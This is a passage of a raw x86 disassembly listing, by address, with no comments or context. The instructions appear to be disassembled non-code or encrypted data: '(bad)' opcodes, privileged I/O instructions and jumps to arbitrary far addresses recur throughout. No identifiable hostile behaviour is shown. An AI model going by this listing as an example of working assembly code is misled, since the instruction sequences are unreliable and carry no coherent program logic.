  40ef13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef14:	in     eax,dx
  40ef15:	mov    bl,0x8b
  40ef17:	sub    DWORD PTR [edx],eax
  40ef19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef1a:	dec    edx
  40ef1b:	sbb    eax,0xe331bead
  40ef20:	lock or BYTE PTR [esi-0x27],0xd6
  40ef25:	loop   0x40ef01
  40ef27:	adc    DWORD PTR [ecx-0x53bc4d97],esi
  40ef2d:	mov    ds:0x936ae862,al
  40ef32:	aas    
  40ef33:	inc    edi
  40ef34:	mov    cl,ch
  40ef36:	inc    BYTE PTR [edx-0x2ed304fa]
  40ef3c:	ss out dx,al
  40ef3e:	push   ecx
  40ef3f:	sahf   
  40ef40:	adc    DWORD PTR [ebx+0x46],0xffffff80
  40ef44:	push   0xcaf27115
  40ef49:	fidivr WORD PTR [esi+0x7a]
  40ef4c:	dec    esp
  40ef4d:	es test al,0x96
  40ef50:	add    BYTE PTR [edi],0xbd
  40ef53:	jns    0x40ef26
  40ef55:	sbb    al,0x4e
  40ef57:	(bad)  
  40ef58:	dec    ebp
  40ef59:	push   ds
  40ef5a:	loop   0x40ef0e
  40ef5c:	bsf    esp,DWORD PTR [ecx+esi*4]
  40ef60:	clc    
  40ef61:	shl    dl,0xfb
  40ef64:	call   FWORD PTR [edi+0x7c]
  40ef67:	inc    ecx
  40ef68:	shl    DWORD PTR [ebx],1
  40ef6a:	and    bh,ah
  40ef6c:	(bad)  
  40ef6d:	push   eax
  40ef6e:	sbb    ebp,DWORD PTR [ebx]
  40ef70:	into   
  40ef71:	mov    WORD PTR [ebx-0x2a],?
  40ef74:	sbb    eax,0x179ccc6d
  40ef79:	outs   dx,DWORD PTR ds:[esi]
  40ef7a:	xor    al,BYTE PTR [edx-0x7fdf11b2]
  40ef80:	test   al,0x1f
  40ef82:	rcl    BYTE PTR [edx+0x1d],1
  40ef85:	add    ch,cl
  40ef87:	xor    al,0x6
  40ef89:	pop    es
  40ef8a:	out    0xfb,al
  40ef8c:	push   ebp
  40ef8d:	shl    BYTE PTR [edx-0x26221a74],1
  40ef93:	loopne 0x40f012
  40ef95:	les    ebp,FWORD PTR ds:0x99a9acfa
  40ef9b:	pop    edi
  40ef9c:	outs   dx,DWORD PTR ds:[esi]
  40ef9d:	mov    ah,0xf6
  40ef9f:	adc    edi,DWORD PTR [edi+ebx*2+0x698a75a5]
  40efa6:	add    dl,BYTE PTR [edi-0x36]
  40efa9:	dec    ecx
  40efaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efab:	dec    ebx
  40efac:	out    0x20,al
  40efae:	outs   dx,DWORD PTR ds:[esi]
  40efaf:	sbb    al,0x15
  40efb1:	scas   al,BYTE PTR es:[edi]
  40efb2:	test   al,0xdc
  40efb4:	out    dx,al
  40efb5:	cdq    
  40efb6:	aas    
  40efb7:	int3   
  40efb8:	xor    al,0x54
  40efba:	popa   
  40efbb:	retf   0xe230
  40efbe:	push   ebx
  40efbf:	jge    0x40efd9
  40efc1:	push   ecx
  40efc2:	ror    DWORD PTR [edx],0xc6
  40efc5:	sub    ebx,0x78f19c68
  40efcb:	fs dec esp
  40efce:	push   ss
  40efcf:	out    dx,al
  40efd0:	stos   BYTE PTR es:[edi],al
  40efd1:	inc    edx
  40efd2:	cld    
  40efd3:	push   eax
  40efd4:	sub    ecx,DWORD PTR [ebx-0x56]
  40efd7:	imul   esi,edi,0xffffffb1
  40efda:	stc    
  40efdb:	bound  ecx,QWORD PTR [ecx-0x1cb3c739]
  40efe1:	idiv   al
  40efe3:	mov    ebp,0x153434a2
  40efe8:	xchg   ch,dh
  40efea:	icebp  
  40efeb:	add    eax,0x2daf6f4e
  40eff0:	mov    ds:0x1dbb98e3,al
  40eff5:	xor    BYTE PTR [eax-0x7d],dl
  40eff8:	sti    
  40eff9:	pop    ss
  40effa:	sti    
  40effb:	(bad)  
  40effc:	rol    BYTE PTR [eax+0x69a99a23],1
  40f002:	inc    esi
  40f003:	dec    esp
  40f004:	jno    0x40f059
  40f006:	cmp    dh,BYTE PTR [edx+0x7601e5ae]
  40f00c:	aaa    
  40f00d:	sbb    al,0x8b
  40f00f:	pop    ecx
  40f010:	and    BYTE PTR [edi+0x19],dh
  40f013:	adc    edi,DWORD PTR [eax-0x49]
  40f016:	inc    ebx
  40f017:	pop    edx
  40f018:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f019:	sub    ch,BYTE PTR [ecx]
  40f01b:	pop    ebx
  40f01c:	jno    0x40f02f
  40f01e:	adc    BYTE PTR [ebx-0x7881cbee],dl
  40f024:	sbb    ch,ch
  40f026:	or     DWORD PTR [edi-0x15d0fc22],ecx
  40f02c:	leave  
  40f02d:	fcom   DWORD PTR [ebx+0x4f7d9730]
  40f033:	mov    al,0xd5
  40f035:	inc    edi
  40f036:	retf   
  40f037:	jo     0x40f03f
  40f039:	jno    0x40f0a8
  40f03b:	mov    DWORD PTR [edx+0x391cfaf7],ebp
  40f041:	jo     0x40f0ae
  40f043:	add    BYTE PTR [ebp+0x2f130fdb],bh
  40f049:	int    0xa9
  40f04b:	loopne 0x40f011
  40f04d:	dec    ecx
  40f04e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f04f:	xchg   esi,eax
  40f050:	xchg   edi,eax
  40f051:	add    BYTE PTR [edi],dl
  40f053:	inc    eax
  40f054:	leave  
  40f055:	mov    BYTE PTR [ecx],bh
  40f057:	std    
  40f058:	mov    bh,0x54
  40f05a:	or     dl,al
  40f05c:	inc    esi
  40f05d:	dec    edi
  40f05e:	sar    BYTE PTR [ebx],0xc2
  40f061:	dec    edx
  40f062:	sbb    al,0xdd
  40f064:	xchg   DWORD PTR [esi-0x31],eax
  40f067:	scas   eax,DWORD PTR es:[edi]
  40f068:	jmp    0xc18f:0xfa99e6a2
  40f06f:	in     eax,0x3b
  40f071:	js     0x40f0a0
  40f073:	push   ecx
  40f074:	mov    dh,ah
  40f076:	dec    edi
  40f077:	(bad)  
  40f078:	push   ebx
  40f079:	aad    0x4a
  40f07b:	cmp    eax,0xe857b782
  40f080:	xor    DWORD PTR [eax],esp
  40f082:	xchg   edx,eax
  40f083:	enter  0xbad4,0x61
  40f087:	jge    0x40f08b
  40f089:	xor    eax,0x4ac06b24
  40f08e:	bound  ebx,QWORD PTR [ecx+eax*2-0x28]
  40f092:	lea    edi,[ebx]
  40f094:	test   al,0x94
  40f096:	mov    ch,0xfb
  40f098:	das    
  40f099:	or     DWORD PTR [edi],esi
  40f09b:	mov    dh,0x24
  40f09d:	jnp    0x40f0ae
  40f09f:	push   ebx
  40f0a0:	scas   eax,DWORD PTR es:[edi]
  40f0a1:	(bad)  
  40f0a2:	data16 sbb al,0x3a
  40f0a5:	(bad)  
  40f0a6:	xor    al,0xd6
  40f0a8:	fisttp QWORD PTR [edi-0x74]
  40f0ab:	mov    edi,0xc763d37f
  40f0b0:	sub    eax,0xf7ebda19
  40f0b5:	mov    ds:0xb1475057,al
  40f0ba:	mov    DWORD PTR [esi+0x543d9e38],ebx
  40f0c0:	and    ah,0xc5
  40f0c3:	repz das 
  40f0c5:	mov    al,0x85
  40f0c7:	inc    ebx
  40f0c8:	inc    edi
  40f0c9:	xchg   DWORD PTR [edx],edi
  40f0cb:	jns    0x40f130
  40f0cd:	mov    ah,0x2f
  40f0cf:	sahf   
  40f0d0:	push   ebp
  40f0d1:	inc    edx
  40f0d2:	outs   dx,BYTE PTR ds:[esi]
  40f0d3:	sbb    ebp,DWORD PTR [esi+edi*2-0x30]
  40f0d7:	fadd   DWORD PTR [esi+eax*8+0x1b]
  40f0db:	add    BYTE PTR [edi],bl
  40f0dd:	enter  0x735f,0xe5
  40f0e1:	test   al,0x6f
  40f0e3:	jle    0x40f123
  40f0e5:	(bad)  
  40f0e7:	inc    ebx
  40f0e8:	(bad)  
  40f0e9:	int    0x33
  40f0eb:	xchg   esi,eax
  40f0ec:	xchg   edx,eax
  40f0ed:	int3   
  40f0ee:	pop    esi
  40f0ef:	test   al,0x7
  40f0f1:	mov    WORD PTR [esi+0x7a604399],es
  40f0f7:	push   ecx
  40f0f8:	and    BYTE PTR [ebx-0x77],bh
  40f0fb:	dec    ebx
  40f0fc:	idiv   DWORD PTR [edx+0x61c2188]
  40f102:	retf   0xd49c
  40f105:	mov    dl,0x8b
  40f107:	popf   
  40f108:	es dec ebp
  40f10a:	hlt    
  40f10b:	in     eax,0x1b
  40f10d:	sti    
  40f10e:	rol    DWORD PTR [ebx+0x70],cl
  40f111:	inc    esp
  40f112:	mov    al,BYTE PTR [ebx-0x4e376416]
  40f118:	outs   dx,DWORD PTR ds:[esi]
  40f119:	xchg   edi,eax
  40f11a:	mov    eax,0xe8a94c3a
  40f11f:	scas   eax,DWORD PTR es:[edi]
  40f120:	xchg   ebx,eax
  40f121:	cdq    
  40f122:	push   edi
  40f123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f124:	jge    0x40f0b7
  40f126:	mov    eax,0xe6a21654
  40f12b:	add    BYTE PTR [edi-0x17cf8b5e],0x79
  40f132:	fisub  DWORD PTR [esi]
  40f134:	push   0x22
  40f136:	and    dh,cl
  40f138:	scas   al,BYTE PTR es:[edi]
  40f139:	pop    eax
  40f13a:	push   0x73b7dabe
  40f13f:	hlt    
  40f140:	mov    ch,0x6b
  40f142:	into   
  40f143:	mov    ds:0x408f39f3,al
  40f148:	xor    bl,BYTE PTR [esi+0x578df3bd]
  40f14e:	fnstenv [edi+0x51]
  40f151:	fld    st(7)
  40f153:	ffree  st(1)
  40f155:	popf   
  40f156:	fstp   TBYTE PTR [edi+0x36]
  40f159:	(bad)  
  40f15a:	call   0x34d4991f
  40f15f:	jmp    0x2c3a8c8f
  40f164:	fbstp  TBYTE PTR [ebx-0x23cb0c67]
  40f16a:	pop    esp
  40f16b:	sar    BYTE PTR [edi],0xfb
  40f16e:	xchg   ch,bl
  40f170:	dec    DWORD PTR [edx]
  40f172:	or     ah,al
  40f174:	(bad)  
  40f175:	stos   DWORD PTR es:[edi],eax
  40f176:	fmul   QWORD PTR [ecx-0x5dc346d4]
  40f17c:	leave  
  40f17d:	pop    ecx
  40f17e:	fidiv  WORD PTR [edx-0x3b]
  40f181:	iret   
  40f182:	cmp    DWORD PTR [ecx-0x1c423237],ebx
  40f188:	pop    eax
  40f189:	push   ebp
  40f18a:	xchg   ecx,eax
  40f18b:	loope  0x40f13c
  40f18d:	je     0x40f1ca
  40f18f:	mov    dh,0x8c
  40f191:	cli    
  40f192:	inc    ebp
  40f193:	mov    ds:0x366a7682,eax
  40f198:	loopne 0x40f120
  40f19a:	inc    ebp
  40f19b:	imul   ebp,DWORD PTR [ecx],0xfffffffe
  40f19e:	mov    ah,dl
  40f1a0:	sahf   
  40f1a1:	push   edi
  40f1a2:	stos   BYTE PTR es:[edi],al
  40f1a3:	push   cs
  40f1a4:	adc    al,0x21
  40f1a6:	cmp    BYTE PTR [ebx],ch
  40f1a8:	cmp    DWORD PTR [esi],eax
  40f1aa:	jbe    0x40f140
  40f1ac:	mov    ch,0xe5
  40f1ae:	push   edx
  40f1af:	mov    ?,WORD PTR [ebx+0x22]
  40f1b2:	add    al,0x94
  40f1b4:	jno    0x40f183
  40f1b6:	sbb    edi,0x7a9e45c0
  40f1bc:	cmp    eax,0x454381b7
  40f1c2:	xlat   BYTE PTR ds:[ebx]
  40f1c3:	fcmove st,st(4)
  40f1c5:	cli    
  40f1c6:	adc    al,0x71
  40f1c8:	stos   DWORD PTR es:[edi],eax
  40f1c9:	xchg   edx,eax
  40f1ca:	mov    edx,0xf4ea059e
  40f1cf:	daa    
  40f1d0:	mov    esp,0x4b50c40f
  40f1d5:	ret    
  40f1d6:	imul   esp,ebx,0xb888e191
  40f1dc:	dec    edx
  40f1dd:	out    dx,eax
  40f1de:	inc    esi
  40f1df:	fbstp  TBYTE PTR [edx+0x151f994f]
  40f1e5:	iret   
  40f1e6:	enter  0xe497,0x77
  40f1ea:	popa   
  40f1eb:	repz scas al,BYTE PTR es:[edi]
  40f1ed:	pop    ds
  40f1ee:	ret    
  40f1ef:	ret    0x1762
  40f1f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1f3:	sti    
  40f1f4:	sar    bl,1
  40f1f6:	pop    ebx
  40f1f7:	pop    esp
  40f1f8:	cmp    cl,al
  40f1fa:	lock add cl,BYTE PTR [ebx-0x6c]
  40f1fe:	imul   ecx,DWORD PTR [eax+0x10],0xffffffae
  40f202:	mov    al,0x56
  40f204:	jne    0x40f23f
  40f206:	xor    eax,DWORD PTR [edi+0x69]
  40f209:	jne    0x40f1f1
  40f20b:	jno    0x40f257
  40f20d:	and    bl,bl
  40f20f:	sbb    DWORD PTR [eax],esi
  40f211:	ds out dx,eax
  40f213:	cld    
  40f214:	ret    0x1614
  40f217:	or     al,al
  40f219:	mov    dl,0x93
  40f21b:	pop    ebp
  40f21c:	scas   eax,DWORD PTR es:[edi]
  40f21d:	inc    edx
  40f21e:	into   
  40f21f:	sbb    DWORD PTR [ebx-0x210e7b20],edi
  40f225:	pop    ecx
  40f226:	stos   BYTE PTR es:[edi],al
  40f227:	xchg   BYTE PTR [edx+0x7e1dc0cc],cl
  40f22d:	or     dl,BYTE PTR [ecx-0x3]
  40f230:	jne    0x40f1c0
  40f232:	xlat   BYTE PTR ds:[ebx]
  40f233:	dec    esp
  40f234:	outs   dx,DWORD PTR ds:[esi]
  40f235:	sbb    DWORD PTR [ebp-0x3d9496f6],ecx
  40f23b:	clc    
  40f23c:	jnp    0x40f268
  40f23e:	jo     0x40f1c2
  40f240:	nop
  40f241:	jbe    0x40f2bc
  40f243:	mov    cl,0x75
  40f245:	test   al,0x96
  40f247:	stc    
  40f248:	jb     0x40f275
  40f24a:	lahf   
  40f24b:	ret    
  40f24c:	ins    DWORD PTR es:[edi],dx
  40f24d:	stos   BYTE PTR es:[edi],al
  40f24e:	lods   eax,DWORD PTR ds:[esi]
  40f24f:	mov    ds:0xb063926,eax
  40f254:	sahf   
  40f255:	and    al,0xb3
  40f257:	(bad)  
  40f258:	loope  0x40f235
  40f25a:	sub    dh,ah
  40f25c:	in     al,dx
  40f25d:	mov    dh,0x58
  40f25f:	rcl    ch,0xfd
  40f262:	jge    0x40f2c2
  40f264:	jp     0x40f207
  40f266:	xor    BYTE PTR [esi+0x11],0xd3
  40f26a:	jno    0x40f2a7
  40f26c:	stos   DWORD PTR es:[edi],eax
  40f26d:	je     0x40f267
  40f26f:	dec    edi
  40f270:	jmp    0x40f26d
  40f272:	(bad)  
  40f273:	(bad)  
  40f276:	ins    BYTE PTR es:[edi],dx
  40f277:	cmp    DWORD PTR [edx],edi
  40f279:	fnstsw WORD PTR [ecx+0x5e]
  40f27c:	into   
  40f27d:	wbinvd 
  40f27f:	push   ebx
  40f280:	shl    dh,0x2d
  40f283:	xor    al,0x66
  40f285:	pushf  
  40f286:	and    BYTE PTR [ebx],cl
  40f288:	or     al,BYTE PTR [esi+edx*1]
  40f28b:	xchg   edx,eax
  40f28c:	outs   dx,BYTE PTR ds:[si]
  40f28e:	popf   
  40f28f:	pop    esp
  40f290:	mov    eax,0x8ff40a82
  40f295:	out    dx,al
  40f296:	stos   BYTE PTR es:[edi],al
  40f297:	mov    esp,0x92647bcf
  40f29c:	retf   0xb919
  40f29f:	test   BYTE PTR [ecx-0x8],bl
  40f2a2:	mov    bl,0xc4
  40f2a4:	leave  
  40f2a5:	mov    DWORD PTR [ecx+0x4],esi
  40f2a8:	arpl   cx,si
  40f2aa:	repz pop ebp
  40f2ac:	ret    0xa974
  40f2af:	mov    cl,0x41
  40f2b1:	shr    BYTE PTR [eax-0x1c],1
  40f2b4:	and    eax,0xe3b58d72
  40f2b9:	mov    cl,0x91
  40f2bb:	imul   edi,DWORD PTR [esi+0x3f],0xffffffae
  40f2bf:	mov    dh,0xf2
  40f2c1:	jnp    0x40f2bf
  40f2c3:	pop    ebp
  40f2c4:	add    eax,0xc2eb6ee6
  40f2c9:	pop    edx
  40f2ca:	neg    DWORD PTR [edx-0x2]
  40f2cd:	jnp    0x40f308
  40f2cf:	mov    bl,BYTE PTR [eax]
  40f2d1:	stos   BYTE PTR es:[edi],al
  40f2d2:	bound  esi,QWORD PTR [edi-0x27]
  40f2d5:	xchg   ebp,eax
  40f2d6:	jmp    0x40f2b5
  40f2d8:	push   eax
  40f2d9:	jno    0x40f25c
  40f2db:	mov    eax,ds:0x4de5fac7
  40f2e0:	or     eax,0x916c9b0b
  40f2e5:	in     al,0x1f
  40f2e7:	rol    BYTE PTR [ebx],0xb6
  40f2ea:	cs add al,0x4b
  40f2ed:	or     ebp,edi
  40f2ef:	jge    0x40f364
  40f2f1:	sub    al,BYTE PTR [edx+0x2c]
  40f2f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2f5:	mov    ebx,0x42feb1c3
  40f2fa:	jno    0x40f35d
  40f2fc:	dec    ebp
  40f2fd:	xchg   BYTE PTR [ebp+0x2a],ah
  40f300:	loop   0x40f30b
  40f302:	lock retf 
  40f304:	shr    ch,1
  40f306:	push   esi
  40f307:	test   BYTE PTR [ecx+0x247b4611],dl
  40f30d:	xchg   ebp,eax
  40f30e:	(bad)  
  40f30f:	nop
  40f310:	xchg   edi,eax
  40f311:	call   FWORD PTR cs:[esi-0x43eba8b6]
  40f318:	ror    ebp,0x4d
  40f31b:	lahf   
  40f31c:	add    DWORD PTR [edx-0x58],ebx
  40f31f:	stos   DWORD PTR es:[edi],eax
  40f320:	xor    BYTE PTR [ecx+ebx*1],dl
  40f323:	mov    cl,0xc4
  40f325:	pushf  
  40f326:	ror    ebx,1
  40f328:	es inc edx
  40f32a:	fabs   
  40f32c:	fadd   QWORD PTR [ebx]
  40f32e:	lahf   
  40f32f:	jne    0x40f364
  40f331:	mov    dh,0xea
  40f333:	push   0xd836831b
  40f338:	sub    al,dh
  40f33a:	sbb    BYTE PTR [edi+0x40],cl
  40f33d:	jae    0x40f39b
  40f33f:	mov    eax,ds:0x72ce110b
  40f344:	push   0x7c3d875d
  40f349:	or     al,0xe1
  40f34b:	call   0xadf03b4b
  40f350:	xor    DWORD PTR [edi],edx
  40f352:	mov    ebx,0xabbeb3bd
  40f357:	inc    edi
  40f358:	outs   dx,BYTE PTR ds:[esi]
  40f359:	aam    0x3a
  40f35b:	nop
  40f35c:	xlat   BYTE PTR ds:[ebx]
  40f35d:	mov    bh,0x73
  40f35f:	call   0xcd1348c5
  40f364:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f365:	sub    eax,esi
  40f367:	add    ch,BYTE PTR [edx+0x69]
  40f36a:	mov    esi,0x1c212626
  40f36f:	xchg   ecx,eax
  40f370:	and    BYTE PTR [edx+0x211fd4f],0x35
  40f377:	(bad)  
  40f378:	in     eax,dx
  40f379:	pop    ecx
  40f37a:	cmp    edi,edi
  40f37c:	adc    DWORD PTR [eax+esi*1-0x14],esi
  40f380:	fimul  WORD PTR [esi+0x4b41e178]
  40f386:	inc    edi
  40f387:	jge    0x40f3fa
  40f389:	test   eax,0x258ad0f2
  40f38e:	aaa    
  40f38f:	js     0x40f376
  40f391:	mov    dh,0xa7
  40f393:	sub    al,0xe1
  40f395:	icebp  
  40f396:	jmp    0x8206:0x76d9890b
  40f39d:	loope  0x40f3a9
  40f39f:	xlat   BYTE PTR ds:[ebx]
  40f3a0:	shr    edx,0xda
  40f3a3:	mov    cl,0x8b
  40f3a5:	sahf   
  40f3a6:	and    cl,cl
  40f3a8:	xor    DWORD PTR [edi+eiz*8+0x57],0x63
  40f3ad:	adc    DWORD PTR [edx],eax
  40f3af:	fldenv [edi]
  40f3b1:	(bad)  
  40f3b2:	test   DWORD PTR [ebp+0x6a],0x26e3b6
  40f3b9:	push   ebx
  40f3ba:	push   ds
  40f3bb:	jae    0x40f3ee
  40f3bd:	cwde   
  40f3be:	test   eax,0x22d3d89f
  40f3c3:	xchg   ebx,eax
  40f3c4:	lods   al,BYTE PTR ds:[esi]
  40f3c5:	arpl   WORD PTR [ecx],cx
  40f3c7:	inc    ebx
  40f3c8:	and    eax,0x4744edcd
  40f3cd:	(bad)  
  40f3ce:	mov    ebx,0x5d81a74
  40f3d3:	xchg   esi,eax
  40f3d4:	(bad)  
  40f3d5:	pop    esi
  40f3d6:	cmp    BYTE PTR [esp+eiz*2+0x5c],ch
  40f3da:	dec    esp
  40f3db:	shl    ebp,cl
  40f3dd:	jecxz  0x40f360
  40f3df:	stc    
  40f3e0:	pop    ds
  40f3e1:	daa    
  40f3e2:	mov    ebp,0x610c2c8a
  40f3e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3e8:	or     DWORD PTR [eax+0x636836b6],eax
  40f3ee:	pop    ecx
  40f3ef:	loopne 0x40f402
  40f3f1:	fisttp WORD PTR [edx-0x5a]
  40f3f4:	mov    bl,0x1e
  40f3f6:	or     al,0x54
  40f3f8:	jl     0x40f3e9
  40f3fa:	jmp    0x40f38f
  40f3fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3fd:	mov    eax,DWORD PTR [edi+ecx*1]
  40f400:	repnz not DWORD PTR [ebx+0x2c]
  40f404:	ja     0x40f3b6
  40f406:	repnz push es
  40f408:	sbb    DWORD PTR [edi-0x2f],ecx
  40f40b:	push   esp
  40f40c:	jno    0x40f3a7
  40f40e:	inc    ebx
  40f40f:	push   0xc93d9da2
  40f414:	adc    al,0x8a
  40f416:	clc    
  40f417:	aas    
  40f418:	scas   al,BYTE PTR es:[edi]
  40f419:	jecxz  0x40f403
  40f41b:	sub    eax,esp
  40f41d:	sub    bl,0x20
  40f420:	inc    edx
  40f421:	cmp    BYTE PTR ds:0x9ea1a1d3,dh
  40f427:	xor    al,0x8d
  40f429:	lahf   
  40f42a:	sub    ebx,DWORD PTR [ebx+0xc]
  40f42d:	pop    edx
  40f42e:	out    dx,eax
  40f42f:	or     eax,ebx
  40f431:	push   es
  40f432:	(bad)  
  40f433:	mov    ch,BYTE PTR [ecx]
  40f435:	dec    eax
  40f436:	jle    0x40f3ba
  40f438:	mov    DWORD PTR [ebx],ebp
  40f43a:	pop    ds
  40f43b:	mov    eax,ds:0xd43bbefa
  40f440:	mov    al,0x1c
  40f442:	bound  esi,QWORD PTR [ecx-0x66]
  40f445:	sbb    al,0x2b
  40f447:	je     0x40f3f2
  40f449:	sub    DWORD PTR [esi],ecx
  40f44b:	je     0x40f425
  40f44d:	sbb    BYTE PTR [edx-0x39542d47],ah
  40f453:	sbb    eax,0xb3a73deb
  40f458:	ss push edx
  40f45a:	hlt    
  40f45b:	jge    0x40f4cf
  40f45d:	loope  0x40f3ef
  40f45f:	aad    0x5f
  40f461:	jo     0x40f3e5
  40f463:	push   edx
  40f464:	imul   eax,DWORD PTR [ebx-0x61],0x7a58426f
  40f46b:	cdq    
  40f46c:	jo     0xf72a3402
  40f472:	(bad)  
  40f473:	fst    DWORD PTR [eax-0x1ccce90c]
  40f479:	jb     0x40f42e
  40f47b:	sti    
  40f47c:	je     0x40f4a0
  40f47e:	cmp    eax,0x68d34643
  40f483:	shr    DWORD PTR [edx+0x656a1e0b],cl
  40f489:	mov    al,0x68
  40f48b:	push   edx
  40f48c:	push   esp
  40f48d:	(bad)  
  40f48e:	out    dx,eax
  40f48f:	ror    al,1
  40f491:	(bad)  
  40f492:	repnz adc eax,DWORD PTR [edi]
  40f495:	pop    ss
  40f496:	repz (bad) 
  40f498:	js     0x40f4d8
  40f49a:	repnz push eax
  40f49c:	out    0xef,al
  40f49e:	xor    al,0xb9
  40f4a0:	pop    ebp
  40f4a1:	rcl    BYTE PTR [ebp+edi*8+0x110afa2e],1
  40f4a8:	sti    
  40f4a9:	sbb    eax,DWORD PTR [ebp-0x6e085dd1]
  40f4af:	cli    
  40f4b0:	outs   dx,DWORD PTR ds:[esi]
  40f4b1:	int    0xfa
  40f4b3:	inc    ecx
  40f4b4:	retf   0x59a8
  40f4b7:	dec    esp
  40f4b8:	or     eax,0x9d4bb86c
  40f4bd:	test   DWORD PTR [ecx-0x5241f6cf],ebp
  40f4c3:	xor    al,0xe
  40f4c6:	xchg   ebx,eax
  40f4c7:	mov    WORD PTR cs:[eax],ss
  40f4ca:	inc    ecx
  40f4cb:	repz leave 
  40f4cd:	xchg   esi,eax
  40f4ce:	icebp  
  40f4cf:	ror    eax,0xa2
  40f4d2:	loopne 0x40f4c2
  40f4d4:	jmp    FWORD PTR [ebx]
  40f4d6:	sti    
  40f4d7:	dec    esi
  40f4d8:	out    0xdc,al
  40f4da:	mov    ecx,0x7e3fb202
  40f4df:	ins    BYTE PTR es:[edi],dx
  40f4e0:	lahf   
  40f4e1:	cmp    al,0x99
  40f4e3:	sbb    DWORD PTR [eax+0x6],0x128e7ffb
  40f4ea:	ins    DWORD PTR es:[edi],dx
  40f4eb:	mov    esp,0xb9880d80
  40f4f0:	retf   0x1286
  40f4f3:	shr    dh,cl
  40f4f5:	adc    al,0x5f
  40f4f7:	(bad)  
  40f4f8:	(bad)  [ecx-0x11]
  40f4fb:	sbb    al,0xdb
  40f4fd:	or     BYTE PTR [ebx-0xaad14],0x86
  40f504:	cmp    bh,BYTE PTR [edx]
  40f506:	xor    DWORD PTR [edx-0x4a],ebp
  40f509:	pop    edx
  40f50a:	push   edi
  40f50b:	jns    0x40f4ba
  40f50d:	shr    esp,0x8b
  40f510:	sub    ebp,DWORD PTR [eax]
  40f512:	pop    ebp
  40f513:	call   0x1d8d:0x61f1bb9
  40f51a:	(bad)  
  40f51b:	enter  0x84a8,0xa6
  40f51f:	jnp    0x40f535
  40f521:	jae    0x40f538
  40f523:	xor    al,0xc1
  40f525:	hlt    
  40f526:	xor    bl,ch
  40f528:	sti    
  40f529:	fstp   TBYTE PTR [edi+0x5a299da5]
  40f52f:	pop    ebx
  40f530:	rol    bh,0xa0
  40f533:	push   edx
  40f534:	jmp    0x5363:0x5e29da63
  40f53b:	and    esi,DWORD PTR [edi+0x7017286f]
  40f541:	int3   
  40f542:	cli    
  40f543:	lods   eax,DWORD PTR ds:[esi]
  40f544:	sub    dh,BYTE PTR [ebx]
  40f546:	fisttp DWORD PTR [edx]
  40f548:	sar    DWORD PTR [edi+0x7f],0x93
  40f54c:	sub    al,0x97
  40f54e:	inc    ecx
  40f54f:	mov    cl,0xdc
  40f551:	inc    edi
  40f552:	inc    esp
  40f553:	es scas al,BYTE PTR es:[edi]
  40f555:	xchg   edi,eax
  40f556:	xchg   dl,al
  40f558:	aas    
  40f559:	test   BYTE PTR [edx],ah
  40f55b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f55c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f55d:	mov    al,0x6e
  40f55f:	ins    DWORD PTR es:[edi],dx
  40f560:	push   edi
  40f561:	ret    
  40f562:	ds inc ebp
  40f564:	mov    ebp,0x1f23c003
  40f569:	pop    esp
  40f56a:	sub    dl,BYTE PTR [ecx]
  40f56c:	sub    al,0x51
  40f56e:	call   0x8240:0x24fad7e9
  40f575:	push   esi
  40f576:	repz test BYTE PTR [esi-0x3475e7f8],bh
  40f57d:	gs (bad) 
  40f57f:	cld    
  40f580:	cmp    eax,0xd53524c6
  40f585:	cmc    
  40f586:	and    ch,BYTE PTR es:[edx+0x13dc879b]
  40f58d:	mov    cl,0xca
  40f58f:	lods   al,BYTE PTR ds:[esi]
  40f590:	xlat   BYTE PTR ds:[ebx]
  40f591:	or     edi,ebx
  40f593:	cmp    eax,0xbfa61f43
  40f598:	ds and eax,esi
  40f59b:	add    ch,BYTE PTR [eax+0x7f]
  40f59e:	add    BYTE PTR [ebp-0x1b276861],bh
  40f5a4:	test   al,0x71
  40f5a6:	xchg   ebx,eax
  40f5a7:	cwde   
  40f5a8:	rcl    BYTE PTR ds:0x2199fb70,0x5d
  40f5af:	pop    ss
  40f5b0:	push   ebp
  40f5b1:	out    dx,eax
  40f5b2:	aas    
  40f5b3:	aam    0x9e
  40f5b5:	cmp    eax,0x1939c1c6
  40f5ba:	jno    0x40f553
  40f5bc:	sbb    al,0xea
  40f5be:	mov    bh,ah
  40f5c0:	mov    edx,0x1a046da2
  40f5c5:	loopne 0x40f55f
  40f5c7:	jns    0x40f628
  40f5c9:	in     al,dx
  40f5ca:	or     esp,DWORD PTR [ebx-0x1a485513]
  40f5d0:	nop
  40f5d1:	cmp    ecx,DWORD PTR [ebx-0x60]
  40f5d4:	jmp    0x1c8ac176
  40f5d9:	mov    ch,0x62
  40f5db:	and    ebx,DWORD PTR [esi+0x1f1e8dc9]
  40f5e1:	xor    edi,eax
  40f5e3:	mov    edi,0xb41d9357
  40f5e8:	dec    edx
  40f5e9:	rol    DWORD PTR [ebp-0x281e7515],0x16
  40f5f0:	mov    dl,0x83
  40f5f2:	mov    edx,0x1d7d7979
  40f5f7:	mov    dh,cl
  40f5f9:	jecxz  0x40f58a
  40f5fb:	(bad)  
  40f5fd:	mov    DWORD PTR [ebx],ebx
  40f5ff:	or     al,0x29
  40f601:	adc    BYTE PTR [eax+0x4bce29ae],0x65
  40f608:	js     0x40f603
  40f60a:	adc    al,0x93
  40f60c:	or     DWORD PTR [ebx],esi
  40f60e:	xchg   edi,eax
  40f60f:	sbb    edi,DWORD PTR [ebx-0x55]
  40f612:	jl     0x40f5c6
  40f614:	loop   0x40f62d
  40f616:	pop    esi
  40f617:	stos   BYTE PTR es:[edi],al
  40f618:	or     al,0xef
  40f61a:	sbb    DWORD PTR [ebx+0x11],ecx
  40f61d:	xor    esp,DWORD PTR [edi]
  40f61f:	sub    ecx,DWORD PTR [esi-0x2d]
